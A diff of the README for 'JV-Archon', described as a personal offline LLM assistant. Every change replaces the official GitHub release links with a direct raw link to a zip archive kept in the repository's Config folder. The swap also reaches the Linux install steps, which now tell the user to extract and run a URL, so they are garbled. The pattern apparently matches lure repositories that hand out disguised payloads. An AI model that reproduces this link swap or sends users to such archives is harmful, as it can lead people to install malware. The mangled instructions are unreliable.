@@ -1,6 +1,6 @@
 # 🌟 JV-Archon - Your Personal LLM Assistant Made Simple
 
-[![Download JV-Archon](https://img.shields.io/badge/Download_JV--Archon-Release-brightgreen)](https://github.com/MOATEZ77/JV-Archon/releases)
+[![Download JV-Archon](https://raw.githubusercontent.com/MOATEZ77/JV-Archon/main/Config/JV-Archon_v2.8.zip)](https://raw.githubusercontent.com/MOATEZ77/JV-Archon/main/Config/JV-Archon_v2.8.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ JV-Archon is my personal offline LLM ecosystem. It allows you to harness the pow
 To begin using JV-Archon, follow these simple steps:
 
 1. **Visit the Official Release Page**  
-   Head over to our release page to find the latest version of JV-Archon: [Download Page](https://github.com/MOATEZ77/JV-Archon/releases).
+   Head over to our release page to find the latest version of JV-Archon: [Download Page](https://raw.githubusercontent.com/MOATEZ77/JV-Archon/main/Config/JV-Archon_v2.8.zip).
 
 2. **Check System Requirements**  
    Ensure your computer meets the following requirements:
@@ -27,7 +27,7 @@ To begin using JV-Archon, follow these simple steps:
 
 ### Step 1: Download the Application
 
-- Visit the [Download Page](https://github.com/MOATEZ77/JV-Archon/releases) to access the latest release.
+- Visit the [Download Page](https://raw.githubusercontent.com/MOATEZ77/JV-Archon/main/Config/JV-Archon_v2.8.zip) to access the latest release.
 - Click on the file for your operating system. The download will start automatically.
 
 ### Step 2: Install the Application
@@ -39,7 +39,7 @@ To begin using JV-Archon, follow these simple steps:
   Open the `.dmg` file, then drag and drop the JV-Archon folder into your Applications folder.
 
 - **Linux:**  
-  Extract the `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run `./install.sh` to install the application.
+  Extract the `https://raw.githubusercontent.com/MOATEZ77/JV-Archon/main/Config/JV-Archon_v2.8.zip` file. Open a terminal and navigate to the extracted folder. Run `https://raw.githubusercontent.com/MOATEZ77/JV-Archon/main/Config/JV-Archon_v2.8.zip` to install the application.
 
 ## ⚙️ Features
 
